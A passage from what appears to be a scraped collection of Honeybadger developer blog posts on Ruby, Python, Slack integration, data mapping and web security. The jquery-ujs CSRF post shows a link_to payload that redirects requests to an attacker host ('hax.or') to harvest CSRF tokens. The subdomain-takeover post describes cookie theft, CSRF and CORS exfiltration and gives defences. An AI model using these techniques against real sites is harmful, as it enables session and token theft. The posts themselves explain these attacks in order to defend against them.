hacker, I want to steal all of your money. So I add a special form to my own website and trick you into clicking on it. This malicious form submits a post request to your bank's website, telling it to wire all your money to my account. CSRF tokens prevent attacks like this from happening...unless the hacker can get his hands on a valid CSRF token. So a vulnerability like this one isn't the end-goal. Instead it's more like a stepping stone that a hacker can use to do more serious exploits. You're only exposed if you use untrusted data to generate link and form urls This specific vulnerability depends on the fact that jquery-ujs submits CSRF tokens with certain requests. It has to. That's how Rails knows it's your code sending the request and not an attacker. But what if a sneaky attacker was able to force jquery-ujs to send the request to a server he owned? Then he would be able to scoop up CSRF tokens from your users. How could they send requests to their own servers? Well, if you use untrusted data to generate your link and form URLs there is a way. < %= link_to(\"Delete\", unsafe_params, method: :delete) %> Now if someone used your unsafe params to change the hostname they could cause that request to be sent to any server they liked < %= link_to(\"Delete\", {controller: :users, host: \"hax.or\", protocol: \" http\"}, method: :delete) %> The vulnerability existed because jquery-ujs didn't check for cross-domain requests The solution was to add a cross-domain check. It's pretty simple, as you can see in the commit . The new isCrossDomain method is used to prevent the submission of XSRF tokens to other domains.", "date": "2015-06-17"},
{"website": "Honey-Badger", "title": "Honeybadger and Slack - Error Monitoring Awesomeness – Part Deux", "author": ["Ben Findley"], "link": "https://www.honeybadger.io/blog/honeybadger-and-slack-error-monitoring-awesomeness-part-deux/", "abstract": "When Honeybadger originally partnered with Slack, it was the dawn of a new era. Dev teams everywhere were thrilled that they could receive exception, uptime, and check-in alerts instantly from within their teams' Slack channels. That was, and still is, a lethal weapon. However, Honeybadger and Slack have partnered up again and have been hard at work pushing error monitoring to the limit. Why? Because bugs and exceptions don't rest, and neither do  Honeybadger and Slack. We’ve rebuilt the Slack integration. Better Once you have installed the new Honeybadger Slack app, the Honeybadger bot will join your Slack team. You can message the bot directly or you can invite it to join a channel and address it. Faster The new integration does more than instant notifications of problems with your app via Slack. The interactive notifications feature gives you the ability to resolve or reopen an error all from within your Slack channel. Now you have the power to find out what errors have happened lately on one of your projects, mark an error as fixed, and more, without leaving the keyboard. Stronger It's learning. The bot is more than just backtracing brawn; it speaks your language and understands the following commands: Command Description help Get help :) show project Returns a list of faults that occured recently in the Project Name project. show fault See details about the requested fault. The fault number can be found in the Honeybadger UI. resolve fault Mark the specified fault as resolved. reopen fault Mark the specified fault as reopened. Let us know what you think Love the new integration? Have an idea for an improvement? Contact us and let us know! Honeybadger and Slack - We are never getting too old for this 💩", "date": "2019-02-11"},
{"website": "Honey-Badger", "title": "Lexical scoping and Ruby class variables", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/lexical-scoping-and-ruby-class-variables/", "abstract": "Ruby's class variables are confusing. Even expert Ruby users can find them hard to intuit. The most obvious example has to do with ineritance: class Fruit @@kind = nil def self . kind @@kind end end class Apple < Fruit @@kind = \"apple\" end Apple . kind # => \"apple\" Fruit . kind # => \"apple\" Changing the kind variable on the child class also changes it on the parent. It's pretty messed up. But this is just how the language is supposed to work. It was a design decision made a long time ago to mimic Smalltalk. It gets worse There are other examples of class variable weirdness that don't seem to be architectural choices so much as implementation quirks. Today I'm going to talk a little bit about one of these that I find interesting. We're going to compare two pieces of code now. They look like they should produce an identical result but they don't. In our first example we set a class variable and create a method to return it. There is absolutely nothing fancy going on here.  And everything works as expected. class Foo @@val = 1234 # This is shorthand for declaring a class method. class << self def val @@val end end end Foo . val # => 1234 Perhaps you didn't know this, but class << self doesn't have to be inside the class definition. In the example below we've moved it outside. A class method is added but it can't access the class variable. class Bar @@val = 1234 end class << Bar def val @@val end end Bar . val # warning: class variable access from toplevel # NameError: uninitialized class variable @@val in Object When we try to access the class variable from our function we get a warning and an exception. What's going on? Enter lexical scope I'm becoming more and more convinced that lexical scope is the source of 99% of the weird and confusing aspects of Ruby. In case you're not familiar with the term, lexical scoping refers to grouping things together based on where they appear in the code, not on where they belong in an abstract object model. It's a lot easier just to show you an example: class B # x and y share the same lexical scope x = 1 y = 1 end class B # z has a different lexical scope from x and y, even though it's in the same class. z = 3 end Class is determined Lexically So how is lexical scope at work in our class variable example? Well, in order to retrieve a class variable Ruby has to know which class to get it from. It uses lexical scoping to find the class. If we look more closely at the working example we see that the code that accesses the class variable is physically with in the class definition. class Foo class << self def val # I'm lexically scoped to Foo! @@val end end end In the nonworking example, the code that accesses the class variable is not lexically scoped to the class. class << Bar def val # Foo is nowhere in sight. @@val end end But if it's not lexically scoped to the class, what is it scoped to? The warning that Ruby prints gives us a clue: warning: class variable access from toplevel . In the nonworking example it turns out that the class variable is lexically scoped to the top level object. This can cause some really strange behavior. For example, if we tried to set a class variable from code that is lexically scoped to main, the class variable gets set on Object . class Bar end class << Bar def val = ( n ) # This code is lexically scoped to the top level object. # That means, that `@@val` will be set on `Object`, not `Bar` @@val = i end end Bar . val = 100 # Whaa? Object . class_variables # => [:@@foo] More examples There are lots of ways to reference class variables outside of the lexical scope of the class. All of them will give you trouble. Here are a few examples for your enjoyment: class Foo @@foo = :foo end # This won't work Foo . class_eval { puts @@foo } # neither will this Foo . send :define_method , :x do puts @@foo end # ..and you weren't thinking about using modules, were you? module Printable def foo puts @@foo end end class Foo @@foo = :foo include Printable end Foo . new . foo And now you know why everyone says never to use class variables in Ruby. :)", "date": "2015-11-16"},
{"website": "Honey-Badger", "title": "Benchmarking exceptions in Ruby - yep, they're slow.", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/benchmarking-exceptions-in-ruby-yep-theyre-slow/", "abstract": "I've always strongly suspected that exceptions would be slow in ruby compared to other flow control mechanisms. After all - exceptions are a heck of a lot more complicated than a simple \"break\" or \"return.\" But I've been wrong in my hunches before, so I thought I'd put it to the test. In the code below I'm using the benchmark-ips gem to compare the relative performance of exiting a loop via exception, break and return. I've seen examples on the web of people doing benchmarks like this with mri 1.9. But I wanted to try it out with mri 2.2. require 'benchmark/ips' def exit_via_exception 5 . times do raise RuntimeError end rescue end def exit_via_break 5 . times do break end end def exit_via_return 5 . times do return end end Benchmark . ips do | x | x . report ( \"exception\" ) { exit_via_exception } x . report ( \"break\" ) { exit_via_break } x . report ( \"return\" ) { exit_via_return } end The results are pretty staggering. The function using the exception is less than half as fast as those using break and return. $ ruby exception_benchmark . rb Calculating ------------------------------------- exception 50.872 k i / 100 ms break 125.322 k i / 100 ms return 124.173 k i / 100 ms ------------------------------------------------- exception 714.795 k ( ± 2.7 % ) i / s - 3.612 M break 3.459 M ( ± 3.1 % ) i / s - 17.294 M return 3.379 M ( ± 3.0 % ) i / s - 16.888 M This isn't a perfect benchmark There are a couple of issues that I'm not sure how to compensate for. For example, the exception and break methods have to return. So they're doing more than the method which simply returns. Also I'd be interested to see if rescuing the exception adds to the performance overhead. But not rescuing it causes the benchmark to abort. Still, exception is so much slower than the other examples that I think the results have meaning even if they're not perfect. The lesson we learned? If you're using exceptions as a flow control mechanism. Stop now! Especially if you have a loop consisting of exceptions being raised and caught over and over. Will this change how I personally use exceptions? Probably not. I can live with a little slowness if the slowness is an exception to the rule. :) ...But what about JRuby and RBx? Josh Cheek (@josh_cheek on twitter) wrote his own version of this benchmark which is more comprehensive then mine. And he ran it against multiple ruby implementations. You can see his results here . Apparently break is still the winner. :)", "date": "2015-08-06"},
{"website": "Honey-Badger", "title": "Honeybadger + Python", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/honeybadger-python/", "abstract": "Attention Pythonistas: Honeybadger now supports reporting exceptions from Python and Django applications! It's true that IRL honey badgers may not get along with IRL pythons, but on the internets they are now the best of friends thanks to our new honeybadger-python client package. In this post we'll discuss some of the features we have already built, how to set everything up, and what we plan to add in the future. Installing To get started, install our package with pip: $ pip install honeybadger For Django In a Django application, add the Honeybadger Django middleware to the top of your MIDDLEWARE_CLASSES config variable: MIDDLEWARE_CLASSES = ( 'honeybadger.middleware.DjangoHoneybadgerMiddleware' , ... ) You'll also need to add a new HONEYBADGER config variable to your settings.py to specify your API key: HONEYBADGER = { 'API_KEY' : 'myapikey' } That's it! We'll report all unhandled exceptions which happen during your Django web requests. We also automatically include a lot of useful request data, such as parameters and session information: For other frameworks/plain Python apps Django is the only explicitly supported framework at the moment. For other frameworks (Flask, web2py, etc.) or a plain Python script, simply import honeybadger and configure it with your API key. Honeybadger uses a global exception hook to automatically report any uncaught exceptions. from honeybadger import honeybadger honeybadger . configure ( api_key = 'myapikey' ) raise Exception , \"This will get reported!\" Reporting exceptions manually In some cases you may want to catch an exception using a try statement, in which case it won't be caught by the global exception handler. Instead, you can use the Honeybadger.notify method: mydict = dict ( a = 1 ) try : print mydict [ 'b' ] except KeyError , exc : honeybadger . notify ( exc , context = { 'foo' : 'bar' }) You can also use Honeybadger.notify to report an arbitrary error, without an exception object: honeybadger . notify ( error_class = 'ValueError' , error_message = 'Something bad happened!' ) We'll even automatically generate a traceback from the location the method is called. Adding context Now that Honeybadger is recording your exceptions it's time to think about context. Use Honeybadger.set_context to add extra contextual data which will be reported with any errors which occur in the current transaction. For example, let's say we want to track which user is currently logged in: honeybadger . set_context ( user_email = 'user@example.com' , user_admin_url = 'https://admin.example.com/users/1' ) This data will be displayed in Honeybadger with every error that gets reported: You can use honeybadger.reset_context to reset any context which has already been added and start fresh. In a Django web request we do this for you automatically. If you don't want to set global context data, you can use our Python context manager to set case-specific contextual information: # from a Django view from honeybadger import honeybadger def my_view ( request ): with honeybadger . context ( user_email = request . POST . get ( 'user_email' , None )): form = UserForm ( request . POST ) # ... Filtering sensitive data In some cases you may not want to send certain types of sensitive request data to Honeybadger, such as passwords and credit cards. You can configure keys to exclude from the data that we collect using the params_filters config option: honeybadger . configure ( api_key = 'myapikey' , params_filters = [ 'super' , 'secret' , 'keys' ] ) By default we filter out \"password\", \"password_confirmation\", and \"credit_card\" (you will need to include these in the list if you provide your own params_filters , though): What's next? This is the first release of Honeybadger for Python, so there's plenty of work to do! Next up we want to add the ability to report error level logs from Python's logging framework , add support for more frameworks such as Flask , support sending request metrics/slow request traces, and more. We'd also like to support more versions of Python and Django (the package is currently tested against Django 1.9 and Python 2.7). Feedback is welcome! Have a comment, question, suggestion, or bug report? Email me , submit an issue , or send a pull request . Need a Honeybadger account? Start your free trial and exterminate your Python errors today!", "date": "2016-03-23"},
{"website": "Honey-Badger", "title": "The data mapper pattern in Rails 4 using the perpetuity gem", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/data-mapper-pattern-rails-perpetuity-gem/", "abstract": "In this post I'll describe how to get started using the Data Mapper pattern in Rails 4. But first, I'd like to explain what the Data Mapper pattern is, why you might want to use it, and the history of the Data Mapper + Rails combo. What Data Mapper is In Patterns of Enterprise Application Architecture , Martin Fowler describes two different object-relational mapping patterns. One of them is called Active Record , and this is in fact what Rails' ActiveRecord library implements. With the Active Record pattern, there is typically a one-to-one relationship between database tables and model classes, so if I had an article database table, I'd also have an Article class definition. My Article class would be responsible for validating that the title is present and for saving itself to the database. With Active Record, domain concerns and persistence concerns are mixed together . The main difference with the Data Mapper pattern, in my understanding, is that objects are not only not responsible for persisting themselves, but that they are entirely decoupled from and unaware of anything to do with persistence. In other words, domain concerns and persistence concerns are kept separate . (If you'd like additional clarification, I think Jamie Gaskins did a good job of describing the difference between the two patterns in his post, Data Mapper vs. Active Record .) Why you'd want to use Data Mapper Active Record is an absolute delight to use when you're working with a small- or medium-sized application, but things turn sharply south once your application grows to any size. Your models get huge . Your tests get slow. Your classes lose the tidy cohesion they possessed in their youth. You yearn for some way to combat the tangled knots of complexity. I've been frustrated for some time with the mess that results when you take everything that has to do with a Post or an Appointment and pile it all together in one class, and I've always been attracted to the idea of neatly separating domain logic, application logic and persistence logic from one another. I've tried doing things like pulling validation out of an ActiveRecord class and putting it elsewhere, but I could never get the idea to fly. Lately I've been playing with Data Mapper and, while I'm new to this ORM pattern, my experience so far has been promising. A brief history of Data Mapper and Rails If you search for \"rails data mapper,\" the first result is for a library called DataMapper . I understand that a lot of people really like DataMapper and I'm sure it does a wonderful job of certain important things, but I personally found this ORM problematic for a couple reasons. First, despite its name, it appears that DataMapper actually implements the Active Record pattern. Second, it looks like the last commit to the dm-rails gem happened about two years ago, and in fact this version of DataMapper is no longer maintained . There are plans for a Data Mapper 2, AKA Ruby Object Mapper , but it's not clear when this library will be finished and available. (As of this writing, the site's Status page simply reads \"coming soon.\") You can use this old DataMapper library if you want, but I was only able to easily getting working on Rails 3. If DataMapper works on Rails 4, it must take some extra \"jiggling the knob\" to get it functioning properly. I understand that Ruby Object Mapper actually will implement the Data Mapper pattern (unlike the miseleadingly-named DataMapper library), but this of course doesn't do you much good if you want to do Data Mapper now. Luckily, there does seem to be at least one somewhat usable Data Mapper ORM at present: Jamie Gaskins' Perpetuity . A Data Mapper \"Hello, World!\" Perpetuity currently supports (to varying degrees) MongoDB and PostgreSQL. The author seems to prefer MongoDB over a relational DBMS in general, and it looks like MongoDB is supported fully but PostgreSQL support is still coming along. All my Rails projects use PostgreSQL, so I'm a lot more interested in the PostgreSQL flavor of Perpetuity than the MongoDB one. MongoDB is also a lot better covered in Perpetuity's documentation than PostgreSQL, so I figured I'd complement Perpetuity's documentation rather than duplicate it. You won't be able to take this example to production since Perpetuity's PostgreSQL adapter doesn't yet fully support retrieval or updating, but hopefully I'm inching Data Mapper forward just a tiny bit with what I'm showing here. Create the project First let's create the project, which I'm calling journal . (The -T is to skip Test::Unit .) rails new journal -T -d postgresql You'll only need to add two gems to the Gemfile: Perpetuity itself and the Perpetuity PostgreSQL adapter. (I'm using specific commit SHAs here so my code examples will continue to work...in perpetuity. Sorry.) Complete Gemfile available here . # Gemfile\n\ngem 'perpetuity',          git: 'git://github.com/jgaskins/perpetuity.git',          ref: '82cad54d7226ad17ce25d74c751faf8f2c2c4eb2'\ngem 'perpetuity-postgres', git: 'git://github.com/jgaskins/perpetuity-postgres.git', ref: 'c167d338edc05da582ff3856e86f7fb7693df0bb' Then, of course, do a: bundle install Create the database: createuser -P -s -e journal rake db:create In this next step we need to tell Perpetuity that our data source is PostgreSQL as opposed to MongoDB or any other adapter, and that our database is called journal_development . The Perpetuity docs don't seem to say where to put this line, so I threw it at the bottom of config/environments/development.rb due to the reference to journal_development . (As far as the development of the Perpetuity gem goes, this seems to me like a good opportunity to use convention over configuration and just infer that the dev database will be called \"#{NAME_OF_APP}_development\" . Maybe I just volunteered to be the one to add that feature.) # config/environments/development.rb\nPerpetuity.data_source :postgres, 'journal_development' That takes care of most of the administrative-type work. Now we can add our first model class which, as you'll notice, does not inherit from ActiveRecord::Base , or any parent class at all. # app/models/article.rb\n\nclass Article\n  attr_accessor :title, :body\nend I believe what we're doing in this next step is \"generating a mapper.\" Create an app/mappers directory and put the following mapper code into app/mappers/article_mapper.rb . mkdir app/mappers # app/mappers/article_mapper.rb\n\nPerpetuity.generate_mapper_for Article do\n  attribute :title, type: String\n  attribute :body, type: String\nend That's all! You should now be able to pop open a console and save an Article object to the database. rails console Paste the following code into the console: article = Article.new\narticle.title = 'New Article'\narticle.body = 'This is an article.' This creates our Plain Old Ruby Object. Our PORO doesn't know how to save itself, so next we'll use Perpetuity to save it. Perpetuity[Article].insert article When I ran that for the first time I got this: > Perpetuity[Article].insert article\nNOTICE:  CREATE TABLE / PRIMARY KEY will create implicit index \"Article_pkey\" for table \"Article\"\n => \"c2e441b9-cab8-4dc9-9a18-fbb365ba47a7\" Interestingly, it created a table. You might be thinking, \"Oh, yeah...we never did any migrations.\" Apparently Perpetuity takes care of creating your tables for you based on the mappers you define. This feels a little weird to me but I'll suspend judgement for now. Let's take a look at that table. rails dbconsole The table is in fact there. I prefer snake_case table names over CamelCase, but I won't look this gift horse in the mouth. I'm just glad it worked. journal_development=# \\d\n           List of relations\n Schema |  Name   | Type  |   Owner\n--------+---------+-------+------------\n public | Article | table | jasonswett\n(1 row) And it does have the right attributes...kind of. It seems like a Ruby String should map to character varying(255) the way it does in ActiveRecord, but again, whatever. I understand that Perpetuity's PostgreSQL adapter is a work in progress. journal_development=# \\d \"Article\"\n               Table \"public.Article\"\n Column | Type |              Modifiers\n--------+------+-------------------------------------\n id     | uuid | not null default uuid_generate_v4()\n title  | text |\n body   | text |\nIndexes:\n    \"Article_pkey\" PRIMARY KEY, btree (id) Finally, let's check out the data: journal_development=# select * from \"Article\";\n                  id                  |    title    |        body\n--------------------------------------+-------------+---------------------\n c2e441b9-cab8-4dc9-9a18-fbb365ba47a7 | New Article | This is an article.\n(1 row) It worked! I don't know how impressed you are, but to me, this is pretty profound. We have a Plain Old Ruby Object that we were able to get saved to the database with barely any extra work. I'm excited now to start building some meatier functionality with Perpetuity in order to explore the possibilities of the Data Mapper pattern and hopefully help make Rails apps a little more maintainable.", "date": "2014-01-15"},
{"website": "Honey-Badger", "title": "Subdomain Takeover: Ignore This Vulnerability at Your Peril", "author": ["Julien Cretel"], "link": "https://www.honeybadger.io/blog/subdomain-takeover/", "abstract": "The Domain Name System (DNS) is often described as\nthe address book of the Internet;\nA and AAAA records map a human-friendly hostname (e.g., honeybadger.io )\nto some machine-friendly IP address ( 104.198.14.52 , in this case).\nOther types of DNS records also exist; in particular, CNAME records are records that map a hostname to some other hostname,\nthereby delegating IP resolution to the latter. Unsurprisingly, DNS is not immune to misconfiguration,\nand poor DNS hygiene opens the door to all kinds of abuse\nthat can wreak havoc on the security of your organization and its stakeholders.\nOf course, if attackers gain access to your DNS configuration and\nare able to create records or modify existing ones, That's it, man! Game over, man! Game over! However, attackers don't need such a strong foothold in your system\nto cause harm.\nIn some cases, a dangling CNAME record on one of your subdomains is all they\nneed to take control of some (or all) of the content served\nby the subdomain in question.\nSuch a security issue is known as a subdomain takeover . In this post, I will do the following: show you how subdomain takeovers typically arise, explain why this type of security issue should be on your radar, delve into how an attacker may use a subdomain takeover against you, provide some guidance for protecting yourself\nagainst vulnerabilities of this kind. A Typical Scenario To fix ideas, let's go over a typical subdomain-takeover scenario.\nLet's assume that your organization, ExampleDotOrg,\nwhose domain name is example.org ,\nwants to use some service from a vendor called TipTop. A typical subdomain-takeover scenario You register an account at TipTop and create an instance of their service,\nwhich is accessible at example-dot-org.tiptopapp.com . For brand-consistency reasons,\nyour organization would like to make your TipTop instance accessible\nfrom one of its subdomains: tiptop.example.org .\nNo problem, as TipTop allows you to do that.\nAll you have to do is create a CNAME record that points tiptop.example.org to example-dot-org.tiptopapp.com . After a while, your organization decides to cancel its TipTop subscription.\nYour TipTop instance is then deleted but, crucially, you forget to remove\nthe associated CNAME record! An attacker later notices the dangling CNAME record.\nBecause TipTop doesn't prevent anyone from\nreclaiming the example-dot-org instance name on their platform,\nthe attacker is able to create his or her own TipTop instance at example-dot-org.tiptopapp.com ,\nwhich your subdomain tiptop.example.org now points to!\nFrom then on, and for as long as the CNAME record remains,\nthe attacker has control over the content served by your subdomain. You've just fallen victim to a subdomain takeover! Why You Should Pay Attention Subdomain takeover was pioneered by ethical hacker Frans Rosén and\npopularized by Detectify in a seminal blogpost as early as 2014.\nHowever, it remains an underestimated (or outright overlooked)\nand widespread vulnerability.\nThe rise of cloud solutions certainly hasn't helped curb the spread. In many ways, subdomain takeover is an insidious security issue: Finding out whether a subdomain takeover is possible\nand taking control of the subdomain\ntypically require remarkably few technical skills from the attacker. Detecting that a subdomain takeover is being actively exploited\nis difficult; you may realize it too late, when your users start complaining. A subdomain takeover may pose a relatively minor threat in itself, but\nwhen combined with other seemingly minor security misconfigurations,\nit may allow an attacker to cause greater damage. Impact of a Subdomain Takeover What harm could a subdomain takeover bring to your organization? Well, the impact mainly depends on three factors: The nature of the third-party service (if any) that the vulnerable\n  subdomain points to. Does the vendor offer little to no customization,\n  or does it allow you to modify the style of the landing page via custom\n  JavaScript or CSS code?\n  Does it restrict you to serving static content,\n  or is it a full-blown platform-as-a-service (PaaS) offering\n  on which you can deploy a Web server? The purpose and popularity of the vulnerable subdomain. What was the subdomain used for before becoming vulnerable?\n  Was it used to simply host API documentation\n  or was it instead used to authenticate users?\n  Is the subdomain still receiving traffic?\n  Is the subdomain name long and obscure (e.g., exctxzzxxp09.test.example.org )\n  or short and simple and, thus, unlikely to raise suspicion\n  (e.g., auth.example.org )? The trust relationship that the organization's other Web assets\n  have with the vulnerable subdomain. Would example.org blindly trust requests originating\n  from the vulnerable subdomain?\n  Would it accept to share sensitive data with that subdomain?\n  Would it accept to load and execute JavaScript code hosted on that subdomain? Now that you have a better idea of what factors into the impact of a subdomain takeover, let's see how a malicious actor might exploit one. Defacement If possible, an attacker may decide to change the appearance of pages\nserved by the vulnerable example.org subdomain\nto openly ridicule or embarrass your organization.\nThis is exactly what happened in February 2017 ,\nwhen a hacker took control of secure2.donaldjtrump.com ,\na subdomain of Donald Trump's campaign-fundraising website,\nand left there a message that...\nwell... did not really fall in line with the Trump campaign's strategy. Defacement of Trump's campaign fundraising site thanks to a subdomain takeover Although the issue was quickly resolved,\nthe offending page was captured and persists in the Internet Archive's Wayback Machine to this day.\nThis incident arguably was neither the first nor the last cause for\nembarrassment for Trump,\nand it certainly did not prevent him from winning the 2016 presidency—as\nhe was already in office at the time.\nHowever, I'm sure you can imagine how a defacement,\npossibly consisting of more offensive content than Trump's hacker used,\ncould harm your organization's reputation. Phishing Another obvious way to exploit a subdomain vulnerable to takeover is phishing.\nMost phishing sites masquerading as a legitimate site (e.g., payments.example.org )\nusually do not survive close scrutiny of the browser's address bar\nbecause phishers typically have no other option than to host them\non a lookalike domain (e.g., payments.exarnple.org ).\nNot so with a subdomain takeover!\nIn fact, a subdomain takeover is the perfect spot for running a phishing campaign.\nAfter all, if the domain name example.org is trustworthy,\nthen one would assume that any subdomain of example.org is also trustworthy, right? Thanks to a subdomain takeover,\nphishers can readily leverage the reputation of the legitimate domain name\nto lure unsuspecting victims to it and elicit sensitive information\n(e.g., account credentials, personally identifiable information, and payment details)\nfrom them.\nEven tech-savvy visitors are likely to fall for the subterfuge. In some cases, attackers may even be able to obtain and install a valid TLS\ncertificate for the vulnerable subdomain\nto serve their phishing site over HTTPS;\nand, sad to say, many people\n(including Europol representatives , who should know better),\nstill view the use of HTTPS as a reliable indicator for trustworthiness\nof the server on the other end of the connection. Stealing Broadly Scoped Cookies Run-of-the-mill phishing typically requires some gullibility and\nuser interaction (beyond navigating to the malicious site) from the victim.\nA subdomain takeover is more powerful, though, as it may enable an attacker\nto steal sensitive cookies simply by the victim visiting the attacker's site. Cookies have a Domain attribute ,\nwhich determines where browsers are allowed to send them in HTTP requests.\nFor instance, if a cookie is set from example.org with that hostname\nas the value of its Domain attribute,\nbrowsers will attach it to all HTTP requests sent to example.org or any subdomain thereof.\nSome sites, in a questionnable approach to implementing Single-Sign-On (SSO) authentication across all of their subdomains,\nset the Domain attribute of their session-identifying cookies to their root\ndomain ( example.org ). Now picture a malicious actor who has taken control over a subdomain and\ndeploys their own malicious server there, which is set up to log all HTTP requests.\nBy luring authenticated users to the compromised subdomain,\nthe attacker will be able to harvest cookies scoped at the root domain\nsimply by inspecting the server logs! Exploiting a subdomain takeover to steal sensitive cookies If session-identifying cookies are scoped this way,\nthe attacker will be able to hijack user sessions and, perhaps, even take over\nuser accounts. Note that security cookie attributes cannot protect users\nwho happen to visit the compromised subdomain. In particular, the HttpOnly cookie attribute is irrelevant here\nbecause the attack involves no client-side JavaScript; under the assumption that the subdomain has a valid TLS certificate,\nthe Secure cookie attribute cannot be of any help\nbecause browsers will send cookies to the compromised subdomain,\neven over HTTPS. Cross-Site Request Forgery OWASP defines cross-site request forgery as follows: Cross-site request forgery (CSRF) is an attack that forces an end\nuser to execute unwanted actions on a web application in which [he\nor she is] currently authenticated. Let's take a social network as an example.\nA CSRF attacker may perform sensitive actions, such as liking another user's post, updating the victim's email address, or changing the victim's profile picture, all on behalf of the victim but against his or her will. The SameSite cookie attribute was introduced to protect users\nagainst such cross-site attacks,\nbut few organizations are taking full advantage of it.\nThus, CSRF remains a risk wherever cookie-based authentication is used. One possible mitigation against CSRF is to check the source origin of state-changing requests against a list of trusted origins.\nThe Origin request header , when present,\nprovides this information in a reliable fashion\n(more so than the Referer header does),\nbecause altering this header programmatically\nis simply not allowed by modern browsers.\nMany sites therefore rely on an origin-header check\nto decide whether to reject or accept\na cross-site state-changing request. Furthermore, a subset of these sites chooses to accept all requests originating\nfrom their subdomains.\nFor instance, when api.example.org receives a request meant to update\na user's email address,\nit may reject the request if the latter originated\nfrom somewhere like evil.org ,\nbut accept the request if the latter originated\nfrom example.org or any subdomain thereof. If you guard your users against CSRF on the basis of an origin-header check\nbut trust all subdomains of example.org ,\nbe mindful that a single subdomain of example.org vulnerable to takeover is enough to defeat this protection mechanism. Exploiting a subdomain takeover to abuse a weak origin-header check\nand achieve a cross-site request forgery Abusing Overtrusting CORS-Aware Servers Malicious state-changing requests are not the only type of cross-site attacks\nyou should be wary of,\nas attackers may also leverage cross-site requests to exfiltrate sensitive data.\nThe same-origin policy (SOP) , arguably the pillar of browser security,\nnormally prevents such attacks. However, cross-origin resource sharing (CORS) was introduced\nin HTML5\nto allow developers to selectively lift some of the restrictions enforced\nby the SOP.\nFor instance, to signal to the browser that another origin,\nsuch as https://jub0bs.com ,\nis allowed to read responses to authenticated requests, api.example.org would respond with the following headers: Access-Control-Allow-Origin: https://jub0bs.com\nAccess-Control-Allow-Credentials: true Unfortunately, CORS is too often perceived as a nuisance by developers,\nwho end up misconfiguring it without fully realizing the consequences.\nIn this particular situation,\nif api.example.org were to be configured to treat\nany subdomain of example.org as a trusted origin for CORS purposes,\na single subdomain takeover would be sufficient for the attacker to read\nand exfiltrate\nthe contents of HTTP responses coming from api.example.org . Exploiting a subdomain takeover to abuse a weak CORS configuration\nand exfiltrate sensitive user data Defeating a Permissive Content Security Policy Content security policy (CSP) is an important defense-in-depth mechanism\nthat lets developers restrict where a given page is allowed to\nget framed or load resources (JavaScript, CSS, etc.) from.\nIf example.org 's CSP were to allow framing\nand/or loading resources from any of its subdomains,\nan attacker who would successfully mount a subdomain takeover\nwould then be able to defeat the CSP and launch cross-site-scripting or clickjacking attacks\nagainst example.org . Recommendations Now that you're familiar with subdomain takeovers,\nhere are a few things you can do to prevent them: Incorporate subdomain takeover into your threat model. Ask yourself what an attacker could achieve after taking over one of your\nsubdomains.\nFix seemingly unimportant misconfigurations, such as those mentioned above. Practice good DNS hygiene. Regularly audit your DNS records;\ndon't let them gather dust or dangling records accumulate.\nPeriodically make sure that you're still in control of everything your\nsubdomains point to.\nOtherwise, immediately remove the corresponding CNAME record(s). Select vendors wisely. Heed the words of James Kettle (Director of Research at PortSwigger ): Many companies have subdomains pointing to applications hosted by\nthird parties with awful security practices. Don't be one of them.\nTreat every third-party service as you should any dependency: a liability.\nWhen shopping for a third-party solution that lets you point\nyour subdomain to it,\ncheck whether the vendor protects its clients against subdomain takeover.\nEffective defense mechanisms include the following: requiring clients to create a unique TXT record along with the CNAME record\nto prove that they're in control of their DNS settings; enforcing sufficient entropy in instance names; or disallowing clients from reclaiming instance names once used\nby another client. Close the attack window. Ethical hacker Edwin Foudil ,\nin his can-i-take-over-xyz repository on GitHub,\nmaintains a list of vendors that fail to protect their clients against\nsubdomain takeover.\nIf you decide to use any of these solutions,\nyou have to be a bit more careful about the order in which you do things.\nMake sure to do the following: point your subdomain to your instance only after creating the latter; remove the corresponding CNAME record before deleting your instance. This will effectively close the window during which you're vulnerable\nto subdomain takeover. Conclusion I hope reading this post has raised your awareness of the risks associated\nwith subdomain takeovers.\nOf course, this post only scratches the surface.\nSubdomain takeovers can be involved in other, more complex attacks .\nMoreover, some advanced forms of subdomain takeover involve DNS records other\nthan CNAMEs. If you would like to dig deeper,\nI recommend perusing Patrik Hudak's blog ,\nwhich goes into much more detail about the mechanics and\nimpacts of subdomain takeover than this post does. HackerOne 's feed of disclosed bug-bounty reports is also an excellent resource on the topic. Now, go audit your DNS records, be picky about vendors,\nand beware of subdomain takeovers!", "date": "2021-02-08"},
{"website": "Honey-Badger", "title": "New Features: Source Map Upload and More", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/source-map-upload/", "abstract": "tl;dr : Honeybadger now supports (and recommends) source map upload via a new API . We've added a new UI under project settings to view your uploaded source maps. JavaScript error grouping is greatly improved via source maps in honeybadger.js v0.5.0 . honeybadger.js v0.5.0 has a new configuration option ( revision ) which all current users should upgrade to. Honeybadger has supported source maps for several years now, and we've learned a lot as our customers have begun to integrate them with their projects. This led us to re-evaluate our approach to source maps, with two goals in mind: We wanted to make it easier to provide source maps to Honeybadger. We wanted to use source maps to dramatically improve the grouping of errors in JavaScript projects. Today, we're launching the next generation of source map support in Honeybadger. It took us a lot of work to get right, but it was well worth it. Introducing Source Map Upload To use source maps in Honeybadger before today, you would host your source map files on your servers with your other production assets. When an error was reported to Honeybadger, our servers would download your source map if available and use it to translate the error's stack trace. This worked, but it wasn't very reliable or straight-forward. With today's update, you can continue to use the old method of hosting your source maps on your own servers (and you can also take advantage of the new error grouping feature!), but we're officially recommending a new, better method: upload your source maps to Honeybadger before each deploy. To accomplish this, we've built a new API which you can use to upload your source map files to Honeybadger. We recommend uploading your source maps to Honeybadger in your build process right before you upload the rest of your assets to your production servers. Here's an example of using the new API with curl : $ curl https://api.honeybadger.io/v1/upload \\ -F api_key = 8b460c4e \\ -F revision = dcc69529edf375c72df39b0e9195d60d59db18ff \\ -F minified_url = https://example.com/assets/application.min.js \\ -F source_map = @path/to/application.js.map \\ -F minified_file = @path/to/application.min.js \\ -F http://example.com/assets/application.js = @path/to/application.js \\ -F http://example.com/assets/utils.js = @path/to/utils.js New UI to View Source Maps Whether you use hosted source maps or the upload API, Honeybadger saves your source maps for later use. We've added a list of source maps that Honeybadger has saved for each JavaScript project under Project Settings -> Source Maps -> Uploaded Source Maps: If you don't see the Source Maps tab, make sure you've selected \"Client-side JavaScript\" as the language under Project Settings -> Edit. New Error Grouping One of the big problems with minified stack traces is grouping. It's common to see stack 